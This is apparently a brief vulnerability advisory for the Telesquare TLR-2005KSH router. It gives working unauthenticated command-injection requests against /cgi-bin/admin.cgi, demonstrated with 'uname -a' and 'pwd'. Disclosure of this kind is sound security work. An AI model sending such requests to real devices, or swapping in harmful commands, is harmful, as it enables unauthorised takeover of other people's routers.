# Telesquare TLR-2005KSH The router has an unauthorized remote command execution vulnerability

## Vulnerability Details：

By inputting the following payload to access vulnerable devices, an attacker can exploit this vulnerability to execute system commands unauthorized through the 'Cmd' parameter



/cgi-bin/admin.cgi?Command=sysCommand&Cmd=uname%20-a

![1734088238407](C:\Users\zzcun\Desktop\TLR-2005KSH\assets\1734088238407.jpg)

/cgi-bin/admin.cgi?Command=sysCommand&Cmd=pwd

![1734088373076](C:\Users\zzcun\Desktop\TLR-2005KSH\assets\1734088373076.jpg)

This vulnerability affects known product versions: 2.6.36 and later.

